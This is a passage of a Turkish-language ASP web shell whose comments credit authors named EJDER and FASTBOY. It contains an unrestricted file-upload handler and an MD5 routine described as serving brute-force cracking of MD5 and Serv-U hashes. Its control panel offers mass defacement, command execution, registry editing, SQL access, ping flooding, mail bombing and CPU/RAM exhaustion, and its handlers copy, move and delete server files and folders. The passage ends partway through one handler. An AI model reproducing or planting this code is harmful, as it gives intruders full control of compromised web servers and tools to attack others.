    Private CRLF
    Private mobjFieldAry()
    Private mlngCount

    Private Sub RequestData
        Dim llngLength
        mlngBytesReceived = Request.TotalBytes
        mbinData = Request.BinaryRead(mlngBytesReceived)
    End Sub

    Private Sub ParseDelimiter()
        mstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
    End Sub

    Private Sub ParseData()
        Dim llngStart
        Dim llngLength
        Dim llngEnd
        Dim lbinChunk
        llngStart = 1
        llngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)
        While Not llngStart = 0
            llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
            llngLength = llngEnd - llngStart
            lbinChunk = MidB(mbinData, llngStart, llngLength)
            Call ParseChunk(lbinChunk)
            llngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)
        Wend
    End Sub

    Private Sub ParseChunk(ByRef pbinChunk)
        Dim lstrName
        Dim lstrFileName
        Dim lstrContentType
        Dim lbinData
        Dim lstrDisposition
        Dim lstrValue
        lstrDisposition = ParseDisposition(pbinChunk)
        lstrName = ParseName(lstrDisposition)
        lstrFileName = ParseFileName(lstrDisposition)
        lstrContentType = ParseContentType(pbinChunk)
        If lstrContentType = "" Then
            lstrValue = CStrU(ParseBinaryData(pbinChunk))
        Else
            lbinData = ParseBinaryData(pbinChunk)
        End If
        Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)
    End Sub

    Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)
        Dim lobjField
        ReDim Preserve mobjFieldAry(mlngCount)
        Set lobjField = New clsField
        lobjField.Name = pstrName
        lobjField.FilePath = pstrFileName
        lobjField.ContentType = pstrContentType
        If LenB(pbinData) = 0 Then
            lobjField.BinaryData = ChrB(0)
            lobjField.Value = pstrValue
            lobjField.Length = Len(pstrValue)
        Else
            lobjField.BinaryData = pbinData
            lobjField.Length = LenB(pbinData)
            lobjField.Value = ""
        End If
        Set mobjFieldAry(mlngCount) = lobjField
        mlngCount = mlngCount + 1
    End Sub

    Private Function ParseBinaryData(ByRef pbinChunk)
        Dim llngStart
        llngStart = InStrB(1, pbinChunk, CRLF & CRLF)
        If llngStart = 0 Then Exit Function
        llngStart = llngStart + 4
        ParseBinaryData = MidB(pbinChunk, llngStart)
    End Function

    Private Function ParseContentType(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Type:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 15, pbinChunk, CR)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 15
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))
    End Function

    Private Function ParseDisposition(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Disposition:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 22
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))
    End Function

    Private Function ParseName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "name=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 6, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 6
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseName = Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Private Function ParseFileName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "filename=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 10, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 10
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseFileName = Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Public Property Get Count()
        Count = mlngCount
    End Property

    Public Default Property Get Fields(ByVal pstrName)
        Dim llngIndex
        If IsNumeric(pstrName) Then
            llngIndex = CLng(pstrName)
            If llngIndex > mlngCount - 1 Or llngIndex < 0 Then
                Call Err.Raise(vbObjectError + 1, "clsUpload.asp", "Object does not exist within the ordinal reference.")
                Exit Property
            End If
            Set Fields = mobjFieldAry(pstrName)
        Else
            pstrName = LCase(pstrname)
            For llngIndex = 0 To mlngCount - 1
                If LCase(mobjFieldAry(llngIndex).Name) = pstrName Then
                    Set Fields = mobjFieldAry(llngIndex)
                    Exit Property
                End If
            Next
        End If
        Set Fields = New clsField
    End Property

    Private Sub Class_Terminate()
        Dim llngIndex
        For llngIndex = 0 To mlngCount - 1
            Set mobjFieldAry(llngIndex) = Nothing

        Next
        ReDim mobjFieldAry(-1)
    End Sub

    Private Sub Class_Initialize()
        ReDim mobjFieldAry(-1)
        CR = ChrB(Asc(vbCr))
        LF = ChrB(Asc(vbLf))
        CRLF = CR & LF
        mlngCount = 0
        Call RequestData
        Call ParseDelimiter()
        Call ParseData
    End Sub

    Private Function CStrU(ByRef pstrANSI)
        Dim llngLength
        Dim llngIndex
        llngLength = LenB(pstrANSI)
        For llngIndex = 1 To llngLength
            CStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
        Next
    End Function

    Private Function CStrB(ByRef pstrUnicode)
        Dim llngLength
        Dim llngIndex
        llngLength = Len(pstrUnicode)
        For llngIndex = 1 To llngLength
            CStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
        Next
    End Function
End Class

Class clsField
    Public Name
    Private mstrPath
    Public FileDir
    Public FileExt
    Public FileName
    Public ContentType
    Public Value
    Public BinaryData
    Public Length
    Private mstrText

    Public Property Get BLOB()
        BLOB = BinaryData
    End Property

    Public Function BinaryAsText()
        Dim lbinBytes
        Dim lobjRs
        If Length = 0 Then Exit Function
        If LenB(BinaryData) = 0 Then Exit Function

        If Not Len(mstrText) = 0 Then
            BinaryAsText = mstrText
            Exit Function
        End If
        lbinBytes = ASCII2Bytes(BinaryData)
           mstrText = Bytes2Unicode(lbinBytes)
        BinaryAsText = mstrText
    End Function

    Public Sub SaveAs(ByRef pstrFileName)
        Const adTypeBinary=1
        Const adSaveCreateOverWrite=2
        Dim lobjStream
        Dim lobjRs
        Dim lbinBytes
        If Length = 0 Then Exit Sub
        If LenB(BinaryData) = 0 Then Exit Sub
        Set lobjStream = Server.CreateObject("ADODB.Stream")
        lobjStream.Type = adTypeBinary
        Call lobjStream.Open()
        lbinBytes = ASCII2Bytes(BinaryData)
        Call lobjStream.Write(lbinBytes)

        On Error Resume Next

        Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)

        'if err<>0 then response.Write "<br>"&err.Description

        Call lobjStream.Close()
        Set lobjStream = Nothing
    End Sub

    Public Property Let FilePath(ByRef pstrPath)
        mstrPath = pstrPath
        If Not InStrRev(pstrPath, ".") = 0 Then
            FileExt = Mid(pstrPath, InStrRev(pstrPath, ".") + 1)
            FileExt = UCase(FileExt)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileName = Mid(pstrPath, InStrRev(pstrPath, "\") + 1)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, "\") - 1)
        End If
    End Property

    Public Property Get FilePath()
        FilePath = mstrPath
    End Property

    private Function ASCII2Bytes(ByRef pbinBinaryData)
        Const adLongVarBinary=205
        Dim lobjRs
        Dim llngLength
        Dim lbinBuffer
        llngLength = LenB(pbinBinaryData)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarBinary, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBinaryData & ChrB(0))
        Call lobjRs.Update()
        lbinBuffer = lobjRs.Fields("BinaryData").GetChunk(llngLength)
        Call lobjRs.Close()
        Set lobjRs = Nothing
        ASCII2Bytes = lbinBuffer
    End Function

    Private Function Bytes2Unicode(ByRef pbinBytes)
        Dim lobjRs
        Dim llngLength
        Dim lstrBuffer
        llngLength = LenB(pbinBytes)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarChar, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBytes)
        Call lobjRs.Update()
        lstrBuffer = lobjRs.Fields("BinaryData").Value
        Call lobjRs.Close()
        Set lobjRs = Nothing
        Bytes2Unicode = lstrBuffer
    End Function
End Class

function addslash(path)
    if right(path,1)="\" then addslash=path else addslash=path & "\"
end function

sub Upload()
    dim objUpload,f,max,i,name,path,size,success

    set objUpload=New clsUpload

    targetPath=objUpload.Fields("folder").Value
    max=objUpload.Fields("max").Value
success=true
    for i=1 to max
        name=objUpload.Fields("file" & i).FileName
        size=objUpload.Fields("file" & i).Length
        if (name<>"") and (size>0) then
            gMsg=gMsg & "<br>" & vbNewLine & "- " & name & " (" & FormatNumber(size,0) & " bytes): "
            path=addslash(targetPath) & name
            objUpload.Fields("file" & i).SaveAs path

            if FSO.FileExists(path) then
                on error resume next
                set f=objFSO.GetFile(path)
                if IsObject(f) then
                    if f.Size=size then success=true else success=false
                end if
                set f=nothing
            end if
            if success then  gMsg=gMsg & "<font color=blue>uploaded</font>" else gMsg = gMsg & "<font color=red>failed!</font>"
        end if
    next
    response.Write gMsg
    set objUpload=nothing

end sub


'***************************************************************************************************************************************
'************* MD5 HASH Ýþlemi Converted by FASTBOY - Used & Written Brute Algortithms by EJDER ;)  ************************************
'************* Md5 kodlar FASTBOY tarafýndan hem MD5 için hemde Serv-u için toparlanmýþ ve düzeltilmiþtir.   ***************************
'************* KOdlarý Brute olarak belli mantýkla vede Server ýn kaynaklarýný kullanrak bulma, çözme olayýnýda Ejder yazmýþtýr ********
'***************************************************************************************************************************************
'*********************************************************
'*************   COnverted by FASTBOY ;)  ****************
'*******  The Brute Algortihms Owned to EJDER  ;)   ******
'*********************************************************
'*********************************************************
' MD5 kodlama baþladýý..
Private Const BITS_TO_A_BYTE = 8
Private Const BYTES_TO_A_WORD = 4
Private Const BITS_TO_A_WORD = 32

Private m_lOnBits(30)
Private m_l2Power(30)
 
    m_lOnBits(0) = CLng(1)
    m_lOnBits(1) = CLng(3)
    m_lOnBits(2) = CLng(7)
    m_lOnBits(3) = CLng(15)
    m_lOnBits(4) = CLng(31)
    m_lOnBits(5) = CLng(63)
    m_lOnBits(6) = CLng(127)
    m_lOnBits(7) = CLng(255)
    m_lOnBits(8) = CLng(511)
    m_lOnBits(9) = CLng(1023)
    m_lOnBits(10) = CLng(2047)
    m_lOnBits(11) = CLng(4095)
    m_lOnBits(12) = CLng(8191)
    m_lOnBits(13) = CLng(16383)
    m_lOnBits(14) = CLng(32767)
    m_lOnBits(15) = CLng(65535)
    m_lOnBits(16) = CLng(131071)
    m_lOnBits(17) = CLng(262143)
    m_lOnBits(18) = CLng(524287)
    m_lOnBits(19) = CLng(1048575)
    m_lOnBits(20) = CLng(2097151)
    m_lOnBits(21) = CLng(4194303)
    m_lOnBits(22) = CLng(8388607)
    m_lOnBits(23) = CLng(16777215)
    m_lOnBits(24) = CLng(33554431)
    m_lOnBits(25) = CLng(67108863)
    m_lOnBits(26) = CLng(134217727)
    m_lOnBits(27) = CLng(268435455)
    m_lOnBits(28) = CLng(536870911)
    m_lOnBits(29) = CLng(1073741823)
    m_lOnBits(30) = CLng(2147483647)
    
    m_l2Power(0) = CLng(1)
    m_l2Power(1) = CLng(2)
    m_l2Power(2) = CLng(4)
    m_l2Power(3) = CLng(8)
    m_l2Power(4) = CLng(16)
    m_l2Power(5) = CLng(32)
    m_l2Power(6) = CLng(64)
    m_l2Power(7) = CLng(128)
    m_l2Power(8) = CLng(256)
    m_l2Power(9) = CLng(512)
    m_l2Power(10) = CLng(1024)
    m_l2Power(11) = CLng(2048)
    m_l2Power(12) = CLng(4096)
    m_l2Power(13) = CLng(8192)
    m_l2Power(14) = CLng(16384)
    m_l2Power(15) = CLng(32768)
    m_l2Power(16) = CLng(65536)
    m_l2Power(17) = CLng(131072)
    m_l2Power(18) = CLng(262144)
    m_l2Power(19) = CLng(524288)
    m_l2Power(20) = CLng(1048576)
    m_l2Power(21) = CLng(2097152)
    m_l2Power(22) = CLng(4194304)
    m_l2Power(23) = CLng(8388608)
    m_l2Power(24) = CLng(16777216)
    m_l2Power(25) = CLng(33554432)
    m_l2Power(26) = CLng(67108864)
    m_l2Power(27) = CLng(134217728)
    m_l2Power(28) = CLng(268435456)
    m_l2Power(29) = CLng(536870912)
    m_l2Power(30) = CLng(1073741824)

Private Function LShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        LShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And 1 Then
            LShift = &H80000000
        Else
            LShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If

    If (lValue And m_l2Power(31 - iShiftBits)) Then
        LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
    Else
        LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
    End If
End Function
Private Function RShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        RShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And &H80000000 Then
            RShift = 1
        Else
            RShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If
    
    RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)

    If (lValue And &H80000000) Then
        RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
    End If
End Function

Private Function RotateLeft(lValue, iShiftBits)
    RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
End Function

Private Function AddUnsigned(lX, lY)
    Dim lX4
    Dim lY4
    Dim lX8
    Dim lY8
    Dim lResult
 
    lX8 = lX And &H80000000
    lY8 = lY And &H80000000
    lX4 = lX And &H40000000
    lY4 = lY And &H40000000
 
    lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
 
    If lX4 And lY4 Then
        lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
    ElseIf lX4 Or lY4 Then
        If lResult And &H40000000 Then
            lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
        Else
            lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
        End If
    Else
        lResult = lResult Xor lX8 Xor lY8
    End If
 
    AddUnsigned = lResult
End Function

Private Function Fq(x, y, z)
    Fq = (x And y) Or ((Not x) And z)
End Function

Private Function Gq(x, y, z)
    Gq = (x And z) Or (y And (Not z))
End Function

Private Function Hq(x, y, z)
    Hq = (x Xor y Xor z)
End Function

Private Function Iq(x, y, z)
    Iq = (y Xor (x Or (Not z)))
End Function

Private Sub FF(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Fq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub GG(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Gq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub HH(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Hq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub II(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Iq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

'*********************************************************
'*************   COnverted by FASTBOY ;)  ****************
'*******  The Brute Algortihms Owned to EJDER  ;)   ******
'*********************************************************
'*********************************************************

Private Function ConvertToWordArray(sMessage)
    Dim lMessageLength
    Dim lNumberOfWords
    Dim lWordArray()
    Dim lBytePosition
    Dim lByteCount
    Dim lWordCount
    
    Const MODULUS_BITS = 512
    Const CONGRUENT_BITS = 448
    
    lMessageLength = Len(sMessage)
    
    lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
    ReDim lWordArray(lNumberOfWords - 1)
    
    lBytePosition = 0
    lByteCount = 0
    Do Until lByteCount >= lMessageLength
        lWordCount = lByteCount \ BYTES_TO_A_WORD
        lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
        lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
        lByteCount = lByteCount + 1
    Loop

    lWordCount = lByteCount \ BYTES_TO_A_WORD
    lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE

    lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)

    lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
    lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
    
    ConvertToWordArray = lWordArray
End Function

Private Function WordToHex(lValue)
    Dim lByte
    Dim lCount
    
    For lCount = 0 To 3
        lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
        WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
    Next
End Function


Public Function MD5(sMessage)
    Dim x
    Dim k
    Dim AA
    Dim BB
    Dim CC
    Dim DD
    Dim a
    Dim b
    Dim c
    Dim d
    
    Const S11 = 7
    Const S12 = 12
    Const S13 = 17
    Const S14 = 22
    Const S21 = 5
    Const S22 = 9
    Const S23 = 14
    Const S24 = 20
    Const S31 = 4
    Const S32 = 11
    Const S33 = 16
    Const S34 = 23
    Const S41 = 6
    Const S42 = 10
    Const S43 = 15
    Const S44 = 21

    x = ConvertToWordArray(sMessage)
    
    a = &H67452301
    b = &HEFCDAB89
    c = &H98BADCFE
    d = &H10325476

    For k = 0 To UBound(x) Step 16
        AA = a
        BB = b
        CC = c
        DD = d
    
        FF a, b, c, d, x(k + 0), S11, &HD76AA478
        FF d, a, b, c, x(k + 1), S12, &HE8C7B756
        FF c, d, a, b, x(k + 2), S13, &H242070DB
        FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE
        FF a, b, c, d, x(k + 4), S11, &HF57C0FAF
        FF d, a, b, c, x(k + 5), S12, &H4787C62A
        FF c, d, a, b, x(k + 6), S13, &HA8304613
        FF b, c, d, a, x(k + 7), S14, &HFD469501
        FF a, b, c, d, x(k + 8), S11, &H698098D8
        FF d, a, b, c, x(k + 9), S12, &H8B44F7AF
        FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1
        FF b, c, d, a, x(k + 11), S14, &H895CD7BE
        FF a, b, c, d, x(k + 12), S11, &H6B901122
        FF d, a, b, c, x(k + 13), S12, &HFD987193
        FF c, d, a, b, x(k + 14), S13, &HA679438E
        FF b, c, d, a, x(k + 15), S14, &H49B40821
    
        GG a, b, c, d, x(k + 1), S21, &HF61E2562
        GG d, a, b, c, x(k + 6), S22, &HC040B340
        GG c, d, a, b, x(k + 11), S23, &H265E5A51
        GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA
        GG a, b, c, d, x(k + 5), S21, &HD62F105D
        GG d, a, b, c, x(k + 10), S22, &H2441453
        GG c, d, a, b, x(k + 15), S23, &HD8A1E681
        GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8
        GG a, b, c, d, x(k + 9), S21, &H21E1CDE6
        GG d, a, b, c, x(k + 14), S22, &HC33707D6
        GG c, d, a, b, x(k + 3), S23, &HF4D50D87
        GG b, c, d, a, x(k + 8), S24, &H455A14ED
        GG a, b, c, d, x(k + 13), S21, &HA9E3E905
        GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8
        GG c, d, a, b, x(k + 7), S23, &H676F02D9
        GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A
            
        HH a, b, c, d, x(k + 5), S31, &HFFFA3942
        HH d, a, b, c, x(k + 8), S32, &H8771F681
        HH c, d, a, b, x(k + 11), S33, &H6D9D6122
        HH b, c, d, a, x(k + 14), S34, &HFDE5380C
        HH a, b, c, d, x(k + 1), S31, &HA4BEEA44
        HH d, a, b, c, x(k + 4), S32, &H4BDECFA9
        HH c, d, a, b, x(k + 7), S33, &HF6BB4B60
        HH b, c, d, a, x(k + 10), S34, &HBEBFBC70
        HH a, b, c, d, x(k + 13), S31, &H289B7EC6
        HH d, a, b, c, x(k + 0), S32, &HEAA127FA
        HH c, d, a, b, x(k + 3), S33, &HD4EF3085
        HH b, c, d, a, x(k + 6), S34, &H4881D05
        HH a, b, c, d, x(k + 9), S31, &HD9D4D039
        HH d, a, b, c, x(k + 12), S32, &HE6DB99E5
        HH c, d, a, b, x(k + 15), S33, &H1FA27CF8
        HH b, c, d, a, x(k + 2), S34, &HC4AC5665
    
        II a, b, c, d, x(k + 0), S41, &HF4292244
        II d, a, b, c, x(k + 7), S42, &H432AFF97
        II c, d, a, b, x(k + 14), S43, &HAB9423A7
        II b, c, d, a, x(k + 5), S44, &HFC93A039
        II a, b, c, d, x(k + 12), S41, &H655B59C3
        II d, a, b, c, x(k + 3), S42, &H8F0CCC92
        II c, d, a, b, x(k + 10), S43, &HFFEFF47D
        II b, c, d, a, x(k + 1), S44, &H85845DD1
        II a, b, c, d, x(k + 8), S41, &H6FA87E4F
        II d, a, b, c, x(k + 15), S42, &HFE2CE6E0
        II c, d, a, b, x(k + 6), S43, &HA3014314
        II b, c, d, a, x(k + 13), S44, &H4E0811A1
        II a, b, c, d, x(k + 4), S41, &HF7537E82
        II d, a, b, c, x(k + 11), S42, &HBD3AF235
        II c, d, a, b, x(k + 2), S43, &H2AD7D2BB
        II b, c, d, a, x(k + 9), S44, &HEB86D391
    
        a = AddUnsigned(a, AA)
        b = AddUnsigned(b, BB)
        c = AddUnsigned(c, CC)
        d = AddUnsigned(d, DD)
    Next
    
    MD5 = LCase(WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d))
End Function
'***************************************************************************************************************************
'***************************  MD5 KOdlarý Biter.   *************************************************************************
'***************************************************************************************************************************
if popup = False then
'Link ve Konum paneli by EJDER
'Türk Bayraðý Ascii Karakterlerle - Created By FasTBoY :)
Response.Write "<center><table width=200 height=50 cellpadding=0 cellspacing=0><td width=80><table width=80 height=50 cellpadding=0 cellspacing=0><tr><td width=10 align=left valign=middle style=""background-color:AA0000"">&nbsp;</td><td width=70 align=left valign=middle style=""background-color:AA0000""><font size=7 face=Wingdings>Z</font></td></tr></table></td><td width=40></td><td width=80><table width=80 height=50 cellpadding=0 cellspacing=0><tr><td bgcolor=red>&nbsp;</td></tr><tr><td bgcolor=white>&nbsp;</td></tr></table></td></table></center>"
response.write "<center><table width=""100%"" align=""center"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center""><br>"
response.write "<table cellpadding=""0"" cellspacing=""0"" height=""25""><tr><td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<a href='"&FilePath&"?mode=37&konum="&konum&"&Time="&time&"'><b>Sistem Analizi*</b></a> | <a href='"&FilePath&"?mode=18&konum="&konum&"&Time="&time&"' onclick=""mass(this.href);return false;""><b>MASS Attack</b></a> | <a href='"&FilePath&"?mode=21&konum="&FolderPath&"&Time="&time&"' onclick=""tester(this.href);return false;""><b> Permision Tester </b></a> | <a href='"&FilePath&"?mode=24&konum="&konum&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b>Klasör Ýþlemleri</b></a> | <a href='"&FilePath&"?mode=28&konum="&konum&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> CMD </b></a> | <a href='"&FilePath&"?mode=34&konum="&konum&"&Time="&time&"' ><b> My-MS_SQL </b></a> | <a href='"&FilePath&"?mode=45&konum="&konum&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> RegEdit </b></a> | <a href='"&FilePath&"?mode=99&konum="&konum&"&Time="&time&"' onclick=""biz(this.href);return false;""><b> *Biz Kimiz*! </b></a>&nbsp;&nbsp;&nbsp;</td></tr></table><br>"
response.write "<table cellpadding=""0"" cellspacing=""0"" height=""25""><tr><td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<a href='"&FilePath&"?mode=30&konum="&konum&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> Ping Saldýrýsý </b></a> | <a href='"&FilePath&"?mode=33&konum="&konum&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;""><b> Mail Bombardýmaný </b></a> | <a href='"&FilePath&"?mode=31&konum="&konum&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;""><b> Ram & Cpu Saldýrýsý </b></a> | <a href='"&FilePath&"?mode=32&konum="&konum&"&Time="&time&"' onclick=""somur(this.href);return false;""><b> Kaynak SÖmürücü </b></a> | <a href='"&FilePath&"?mode=39&konum="&konum&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b> MD5&Serv-U </b></a> | <a href='"&FilePath&"?mode=42&konum="&konum&"&Time="&time&"' onclick=""mass(this.href);return false;""><b> MSWCTools </b></a> | <a href='"&FilePath&"?mode=44&konum="&konum&"&Time="&time&"' onclick=""mass(this.href);return false;""><b> XMLHTTP </b></a>&nbsp;&nbsp;&nbsp;</td></tr></table><br>"
response.write "</td></tr><td><tr><form action = "" "&FilePath&"?mode=23&konum="&konum&"&Time="&time&" "" method=""post""><table cellpadding=""0"" cellspacing=""0""><tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Arama: &nbsp;&nbsp;&nbsp;</b></td><td><input name=""hacked"" value=""mdb"" type=""text"" style=""width:200px;""></td><td><input type=""Submit"" value=""&nbsp;&nbsp;Ara &raquo;&nbsp;&nbsp;"" style=""width:70; font-weight:bold;""></td></tr></table></td></form></tr><td><tr>"
response.write "<form action = "" "&FilePath&"?mode=1&Time="&time&" "" method=""post"">"
response.write "<table cellpadding=""0"" cellspacing=""0""><tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Konum : &nbsp;&nbsp;&nbsp;</b></td><td><input name=""remote"" value='"&konum&"' type=""text"" style=""width:350px;""></td><td><input type=""Submit"" value=""Git &raquo;"" style=""width:50; font-weight:bold;""></td></tr></table>"
response.write ""
response.write "</td></form></tr>"
response.write "</table></center>"

'Yetki paneli by EJDER
response.write "<table width=""100%"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<table cellpadding=""0"" cellspacing=""0"">"
response.write "<tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Yetki :</b>&nbsp;&nbsp;&nbsp;</td>"
call yetki
response.write "</tr></table>"
response.write "<br></td></tr></table><br>"
end if



SELECT CASE mode
CASE 2 ' Dizin kopyala TAÞI by EJDER
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
tablo30(" <b>Dizin Kopyala / Taþý Merkezi</b>")
tablo30("&nbsp;")
response.write "<input type=""hidden"" value=""3"" name=""mode""><input type=""hidden"" value="&file&" name=""file2""><input type=""hidden"" value="&FolderPath&" name=""konum""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12("Kop. Yer : <input style='color=#C6FCBE'  size=""60"" type=""text"" name=""FolderPath2"" value="&FolderPath&">")
tablo12("<input type=radio name='islem' value='kopyala' checked>Kopyala  <input type=radio name='islem' value='tasi'>Tasi ")
tablo12("<br><input value="" Gönder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Hata

CASE 3 ' dizin kop taþýmam gerçekleþiyor  by EJDER
on error resume next
if islem="kopyala" then
    FSO.CopyFolder konum,FolderPath2
    isl="kopyalandý.."
elseif islem="tasi" then
    FSO.MoveFolder konum,FolderPath2
    isl="taþýndý.."
end if
response.Write "<br><br><center>Klasor "&isl&" <br>"
response.Write "<br><font color=yellow>Kaynak : </font>"&FolderPath&"<br><font color=yellow>Hedef : </font>"&FolderPath2
response.Write "<br><br>by Ejder</center>"
Call Hata

CASE 4 ' Dizin SÝlmee by EJDER
on error resume next
FSO.DeleteFolder del
if err<>0 then
Call olmadi("Dizin Silenemdi")
else
Call oldu("Dizin Silindi")
end if

CASE 5 ' Dosya silme olayý gerçekliþiypor  by EJDER
on error resume next
FSO.DeleteFile del
if err<>0 then
Call olmadi("Dosya Silinemedi")
else
Call oldu("Dosya Silindi")
end if

'CASE 6 ' Dosya Dowlaod etme by EJDER
' Download hatalý olduðu için, ÜSTTE taþýdýmm

CASE 7 ' Dosya Kopayla Taþýma POST kýsmý by EJDER
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
